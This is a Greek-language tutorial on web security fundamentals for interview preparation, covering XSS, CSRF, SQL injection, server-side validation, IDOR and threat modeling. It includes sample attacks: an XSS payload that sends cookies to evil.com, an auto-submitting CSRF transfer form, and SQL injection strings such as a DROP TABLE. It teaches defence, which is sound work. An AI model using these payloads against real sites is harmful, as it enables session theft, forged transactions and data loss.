# Web Security Basics

Το security δεν είναι «θα το δούμε στο τέλος» — είναι τρόπος σκέψης που εφαρμόζεις σε κάθε feature. Στις συνεντεύξεις, τα XSS/CSRF/SQL injection είναι σταθερές ερωτήσεις, και ένας υποψήφιος που μπερδεύει το XSS με το CSRF χάνει αμέσως πόντους. Ο θεμελιώδης κανόνας πίσω από όλα: **ποτέ μην εμπιστεύεσαι input που έρχεται από τον client**.

## XSS — Cross-Site Scripting

**Τι είναι:** ο attacker καταφέρνει να εκτελεστεί **δικό του JavaScript στον browser ενός άλλου χρήστη**, μέσα στο context του site σου. Από εκεί μπορεί να κλέψει δεδομένα, να κάνει requests «ως ο χρήστης», να παραποιήσει τη σελίδα.

```html
<!-- ❌ Ο κλασικός τρόπος να αυτοκτονήσεις -->
<div id="comment"></div>
<script>
  comment.innerHTML = userInput; // αν περιέχει <img src=x onerror="...">
                                  // ο κώδικας του attacker τρέχει!
</script>
```

Παράδειγμα επίθεσης: χρήστης υποβάλλει σχόλιο `<img src=x onerror="fetch('https://evil.com?c='+document.cookie)">`. Κάθε επισκέπτης που βλέπει το σχόλιο στέλνει τα cookies του στον attacker.

Τα τρία είδη που αξίζει να ονομάσεις σε συνέντευξη:

- **Stored XSS**: το payload αποθηκεύεται (σχόλιο στη DB) και χτυπά κάθε επισκέπτη — το χειρότερο.
- **Reflected XSS**: το payload ταξιδεύει στο URL/request και «καθρεφτίζεται» στη σελίδα (π.χ. σελίδα αποτελεσμάτων αναζήτησης).
- **DOM-based XSS**: το sink είναι καθαρά client-side (π.χ. `innerHTML` με δεδομένα από `location.hash`).

**Άμυνες, με σειρά σημασίας:**

1. **Output encoding/escaping by default** — το React/Vue/Angular κάνουν escape ό,τι μπαίνει σε JSX. Το `{userInput}` είναι ασφαλές· το `dangerouslySetInnerHTML` είναι το «παραθυράκι» και θέλει sanitization (π.χ. DOMPurify) πριν.
2. **Content Security Policy (CSP)** — HTTP header που λέει στον browser «εκτέλεσε scripts μόνο από αυτά τα origins». Δεύτερη γραμμή άμυνας αν κάτι ξεφύγει.
3. **HttpOnly cookies** — ακόμα κι αν πετύχει XSS, δεν μπορεί να διαβάσει το session cookie.

```tsx
// React: ασφαλές by default
<p>{comment.text}</p>                                 // ✅ escaped

// Το παραθυράκι — μόνο με sanitization
<div dangerouslySetInnerHTML={{ __html: DOMPurify.sanitize(html) }} />
```

## CSRF — Cross-Site Request Forgery

**Τι είναι:** κακόβουλο site κάνει τον browser σου να στείλει **request στο δικό σου site, με τα δικά σου cookies** — χωρίς να το ξέρεις.

Σενάριο: είσαι logged in στο `mybank.com` (session cookie). Επισκέπτεσαι το `evil.com`, που περιέχει:

```html
<form action="https://mybank.com/transfer" method="POST" id="f">
  <input type="hidden" name="to" value="attacker" />
  <input type="hidden" name="amount" value="1000" />
</form>
<script>document.getElementById("f").submit();</script>
```

Ο browser στέλνει **αυτόματα** τα cookies του mybank.com μαζί με το request — ο server βλέπει «έγκυρο» logged-in request.

Η κρίσιμη διάκριση από το XSS: στο **XSS ο attacker τρέχει κώδικα στο site σου**· στο **CSRF εκμεταλλεύεται το ότι ο browser στέλνει cookies αυτόματα**, χωρίς να τρέξει κώδικα στο site σου και χωρίς να μπορεί να δει το response.

**Άμυνες:**

1. **SameSite cookies** (`Lax`/`Strict`) — το cookie δεν στέλνεται σε cross-site requests. Το `Lax` είναι default στους σύγχρονους browsers και κόβει το παραπάνω σενάριο.
2. **CSRF tokens** — τυχαίο token στη φόρμα που ο server επαληθεύει· το evil.com δεν μπορεί να το διαβάσει.
3. **Έλεγχος `Origin`/`Referer`** header σε sensitive actions.
4. Token auth σε `Authorization` header (αντί cookies) δεν έχει CSRF πρόβλημα — ο browser δεν το στέλνει αυτόματα.

## SQL Injection — το παλιότερο και ακόμα ζωντανό

**Τι είναι:** user input «δραπετεύει» από τη θέση δεδομένων και γίνεται μέρος του SQL:

```js
// ❌ String concatenation — ΠΟΤΕ
const query = `SELECT * FROM users WHERE email = '${email}'`;
// email = "' OR '1'='1' --"  →  επιστρέφει ΟΛΟΥΣ τους users
// email = "'; DROP TABLE users; --"  →  χειρότερα

// ✅ Parameterized queries — τα δεδομένα ΔΕΝ γίνονται ποτέ κώδικας
const result = await db.query("SELECT * FROM users WHERE email = $1", [email]);
```

Με **parameterized queries** (ή ORM που τα χρησιμοποιεί από κάτω), η βάση μεταγλωττίζει το query χωριστά από τα δεδομένα — το input δεν μπορεί να αλλάξει τη δομή του query, ό,τι κι αν περιέχει. Αυτή είναι η ολοκληρωμένη απάντηση: όχι «κάνω escape τα quotes», αλλά «διαχωρίζω κώδικα από δεδομένα».

## Validation: server-side, πάντα

Client-side validation είναι **UX**, όχι security — ο καθένας στέλνει ό,τι θέλει με curl:

```ts
// Με schema validator (Zod) — ένα schema, validation + types μαζί
import { z } from "zod";

const CreateTaskSchema = z.object({
  title: z.string().trim().min(2).max(200),
  dueDate: z.coerce.date().optional(),
});

app.post("/tasks", (req, res) => {
  const parsed = CreateTaskSchema.safeParse(req.body);
  if (!parsed.success) {
    return res.status(422).json({ error: parsed.error.flatten() });
  }
  // parsed.data: typed ΚΑΙ validated — ΜΟΝΟ τα δηλωμένα fields
});
```

Σημαντική λεπτομέρεια: το schema με «allowed fields» προστατεύει και από **mass assignment** — χωρίς αυτό, ένα `{ "role": "admin" }` στο body μπορεί να περάσει κατευθείαν στο `db.update(req.body)`.

## Secrets & sensitive data

- **Ό,τι φτάνει στο frontend bundle είναι δημόσιο** — API keys, ακόμα και σε «κρυφό» αρχείο, διαβάζονται από το DevTools. Secrets μόνο server-side.
- **Όχι secrets στο Git** — `.env` στο `.gitignore`, secret manager σε production. Αν διαρρεύσει key, γίνεται rotate, όχι απλά delete του commit (μένει στο history).
- **Generic error messages προς τα έξω** — το `"Invalid credentials"` αντί για `"Wrong password for user X"`, και ποτέ stack traces σε production responses.
- **Logs χωρίς PII/secrets** — όχι passwords, tokens, πλήρη emails σε log lines.

## Authorization σε κάθε layer — όχι μόνο login

Το πιο συχνό πραγματικό bug σε web apps δεν είναι το XSS — είναι το **IDOR**: ο server ελέγχει «είσαι logged in;» αλλά όχι «σου ανήκει;»:

```ts
// ❌ IDOR: οποιοσδήποτε logged-in χρήστης διαβάζει ΚΑΘΕ task
app.get("/api/tasks/:id", auth, async (req, res) => {
  const task = await db.task.findUnique({ where: { id: req.params.id } });
  res.json(task);
});

// ✅ Ownership check στο query
app.get("/api/tasks/:id", auth, async (req, res) => {
  const task = await db.task.findFirst({
    where: { id: req.params.id, userId: req.user.id },
  });
  if (!task) return res.status(404).json({ error: "Not found" });
  res.json(task);
});
```

## Rate limiting & brute force

Login endpoints χωρίς rate limit = δωρεάν password guessing. Βασική προστασία:

- Rate limit ανά IP **και** ανά λογαριασμό στο `/login` (π.χ. 5 αποτυχίες → cooldown).
- Ίδιος χρόνος απόκρισης και ίδιο μήνυμα είτε υπάρχει ο user είτε όχι (όχι user enumeration).
- Captcha/προοδευτικές καθυστερήσεις μετά από αποτυχίες.

## Σε πραγματικό project: threat modeling ενός feature

Στην πράξη, το security δεν είναι ξεχωριστή φάση — το κάνεις **όταν σχεδιάζεις το feature**. Δες πώς μια ομάδα «επιτίθεται» στο δικό της feature πριν το χτίσει.

Feature: **«ο χρήστης αφήνει σχόλιο σε μια αγγελία, ορατό σε όλους»**. Πριν γραφτεί κώδικας, στο σχεδιασμό, κάποιος ρωτά _«πώς θα το έσπαγα;»_ — και για κάθε απάντηση υπάρχει συγκεκριμένη άμυνα:

```txt
Επίθεση που σκέφτεσαι           →  Άμυνα στο feature
──────────────────────────────────────────────────────────────
"Βάζω <script> στο σχόλιο"      →  React escaping by default· ΟΧΙ
  (Stored XSS — χτυπά κάθε         dangerouslySetInnerHTML χωρίς DOMPurify
   επισκέπτη)                      + CSP ως δεύτερη γραμμή

"Στέλνω { isAdmin: true } στο   →  Zod schema με ρητά allowed fields·
  body" (mass assignment)          ΠΟΤΕ db.create(req.body) ολόκληρο

"Σβήνω σχόλιο άλλου αλλάζοντας  →  ownership check στο query:
  το /comments/43" (IDOR)          where { id, userId: currentUser.id }

"Postάρω 10.000 σχόλια με       →  rate limit στο POST /comments
  script" (spam/abuse)             (π.χ. 5/λεπτό ανά user)

"Βάζω ' OR 1=1 -- στο search"   →  parameterized queries (ORM) —
  (SQL injection)                   τα δεδομένα δεν γίνονται ποτέ κώδικας

"Από evil.com αυτο-submitάρω    →  SameSite=Lax cookie (+ CSRF token
  POST στο API σου" (CSRF)         αν χρειάζεται)
```

Αυτό λέγεται **threat modeling** και είναι πραγματική πρακτική: για κάθε feature γράφεις 4-6 «abuse cases» **πριν** το υλοποιήσεις. Πρόσεξε ότι όλες οι άμυνες είναι **server-side** — γιατί ο attacker δεν χρησιμοποιεί το UI σου, στέλνει raw requests με curl.

Σε code review, το ίδιο feature ελέγχεται με αυτή τη λίστα: _«Πού γίνεται validation; Γίνεται escape το output; Υπάρχει ownership check; Είναι parameterized το query;»_. Αν λείπει έστω ένα, το PR δεν περνά.

## Mini project: secure form handling

Πάρε ένα contact/comment form και θωράκισέ το:

1. Server-side validation με schema (Zod) — μόνο allowed fields.
2. Escaped rendering των submitted data (και απόδειξε το: υπέβαλε `<script>alert(1)</script>` και δες το ως κείμενο).
3. Parameterized queries για την αποθήκευση.
4. Rate limit στο endpoint.
5. Error responses χωρίς λεπτομέρειες υλοποίησης· logging χωρίς ευαίσθητα δεδομένα.

## Security checklist για κάθε feature

- Validate input server-side (schema, allowed fields).
- Escape output — εμπιστεύσου το framework, πρόσεχε τα «παραθυράκια».
- Parameterized queries — ποτέ string concatenation σε SQL.
- Secrets μόνο server-side, ποτέ σε Git.
- Cookies: `HttpOnly` + `Secure` + `SameSite`.
- Authorization (ownership/role) σε κάθε query, όχι μόνο authentication.
- Rate limiting σε auth και ακριβά endpoints.
- Generic errors προς τα έξω, λεπτομέρειες μόνο σε server logs.

## Πώς απαντάς στη συνέντευξη

> I treat all client input as untrusted. Input is validated server-side with a schema and explicit allowed fields, queries are parameterized so injection is structurally impossible, and output is escaped by default — with CSP as a second layer against XSS. Cookies are HttpOnly, Secure, and SameSite, which also covers CSRF. And beyond authentication, every query enforces ownership, because broken access control — IDOR — is the most common real-world vulnerability.
